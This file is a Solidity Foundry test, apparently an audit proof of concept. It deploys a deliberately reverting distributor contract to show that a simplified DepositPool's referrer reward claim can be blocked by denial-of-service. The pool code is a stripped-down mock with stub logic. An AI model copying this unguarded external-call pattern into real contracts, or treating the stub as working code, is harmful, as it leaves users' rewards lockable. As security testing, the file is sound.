// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
}

contract MaliciousDistributor is IDistributor {
    function distributeRewards(uint256) external pure override {
        revert("Malicious revert");
    }
}

contract DepositPool {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    struct RewardPoolProtocolDetails {
        uint256 distributedRewards;
        uint256 claimLockPeriodAfterClaim;
    }

    struct ReferrerData {
        uint256 lastClaim;
    }

    mapping(uint256 => RewardPoolData) public rewardPoolsData;
    mapping(uint256 => RewardPoolProtocolDetails) public rewardPoolsProtocolDetails;
    mapping(address => mapping(uint256 => ReferrerData)) public referrersData;

    address public distributor;
    bool public isMigrationOver = true;

    constructor(address _distributor) {
        distributor = _distributor;
    }

    function _claimReferrerTier(uint256 rewardPoolIndex_, address referrer_, address receiver_) public {
        require(isMigrationOver == true, "DS: migration isn't over");

        IDistributor(distributor).distributeRewards(rewardPoolIndex_);

        (uint256 currentPoolRate_, uint256 rewards_) = _getCurrentPoolRate(rewardPoolIndex_);

        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];
        ReferrerData storage referrerData = referrersData[referrer_][rewardPoolIndex_];

        require(
            block.timestamp > referrerData.lastClaim + rewardPoolProtocolDetails.claimLockPeriodAfterClaim,
            "DS: pool claim is locked (C)"
        );

        uint256 pendingRewards_ = _claimReferrerTierLogic(referrerData, currentPoolRate_);

        // Update `rewardPoolData`
        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex_];
        rewardPoolData.lastUpdate = uint128(block.timestamp);
    }

    function _getCurrentPoolRate(uint256 rewardPoolIndex_) internal view returns (uint256, uint256) {
        return (rewardPoolsData[rewardPoolIndex_].rate, 0);
    }

    function _claimReferrerTierLogic(ReferrerData storage referrerData, uint256 currentPoolRate_) internal returns (uint256) {
        return 0;
    }
}

contract ExploitTest is Test {
    DepositPool depositPool;
    MaliciousDistributor maliciousDistributor;

    function setUp() public {
        // Deploy the malicious distributor
        maliciousDistributor = new MaliciousDistributor();

        // Deploy the DepositPool with the malicious distributor
        depositPool = new DepositPool(address(maliciousDistributor));
    }

    function test_exploit() public {
        // Attempt to claim rewards, which should fail due to the malicious distributor
        vm.expectRevert("Malicious revert");
        depositPool._claimReferrerTier(0, address(this), address(this));
    }
}